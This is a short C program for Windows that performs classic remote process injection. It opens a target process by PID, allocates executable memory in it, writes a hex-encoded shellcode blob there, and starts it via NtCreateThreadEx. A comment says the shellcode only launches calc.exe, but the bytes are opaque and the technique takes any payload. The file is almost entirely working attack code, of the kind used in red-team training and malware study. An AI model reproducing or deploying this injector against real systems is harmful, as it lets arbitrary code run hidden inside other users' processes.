#include<Windows.h>
#include<stdio.h>

EXTERN_C NTSTATUS(NTAPI NtCreateThreadEx)
(
OUT PHANDLE hThread,
IN ACCESS_MASK DesiredAccess,
IN PVOID ObjectAttributes,
IN HANDLE ProcessHandle,
IN PTHREAD_START_ROUTINE lpStartAddress,
IN PVOID lpParameter,
IN ULONG Flags,
IN SIZE_T StackZeroBits,
IN SIZE_T SizeOfStackCommit,
IN SIZE_T SizeOfStackReserve,
OUT PVOID AttributeList
);

int main(int argc, char *argv[])
{
	unsigned char shellcode[] ="\xdb\xd9\xbe\x95\x2c\x95\x21\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"      //simple shellcode that pops calc.exe
"\x31\x31\x77\x18\x83\xef\xfc\x03\x77\x81\xce\x60\xdd\x41\x8c"
"\x8b\x1e\x91\xf1\x02\xfb\xa0\x31\x70\x8f\x92\x81\xf2\xdd\x1e"
"\x69\x56\xf6\x95\x1f\x7f\xf9\x1e\x95\x59\x34\x9f\x86\x9a\x57"
"\x23\xd5\xce\xb7\x1a\x16\x03\xb9\x5b\x4b\xee\xeb\x34\x07\x5d"
"\x1c\x31\x5d\x5e\x97\x09\x73\xe6\x44\xd9\x72\xc7\xda\x52\x2d"
"\xc7\xdd\xb7\x45\x4e\xc6\xd4\x60\x18\x7d\x2e\x1e\x9b\x57\x7f"
"\xdf\x30\x96\xb0\x12\x48\xde\x76\xcd\x3f\x16\x85\x70\x38\xed"
"\xf4\xae\xcd\xf6\x5e\x24\x75\xd3\x5f\xe9\xe0\x90\x53\x46\x66"
"\xfe\x77\x59\xab\x74\x83\xd2\x4a\x5b\x02\xa0\x68\x7f\x4f\x72"
"\x10\x26\x35\xd5\x2d\x38\x96\x8a\x8b\x32\x3a\xde\xa1\x18\x50"
"\x21\x37\x27\x16\x21\x47\x28\x06\x4a\x76\xa3\xc9\x0d\x87\x66"
"\xae\xf2\x65\xa3\xda\x9a\x33\x26\x67\xc7\xc3\x9c\xab\xfe\x47"
"\x15\x53\x05\x57\x5c\x56\x41\xdf\x8c\x2a\xda\x8a\xb2\x99\xdb"
"\x9e\xd0\x7c\x48\x42\x39\x1b\xe8\xe1\x45";


	HANDLE processHandle;
	PVOID remoteBuffer;
	HANDLE hThread;
	HANDLE remoteThread;

	printf("Enter PID: %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);

	NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, processHandle, (PTHREAD_START_ROUTINE)remoteBuffer, NULL, FALSE, NULL, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
	
	//remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	//CloseHandle(processHandle);
	return 0;
}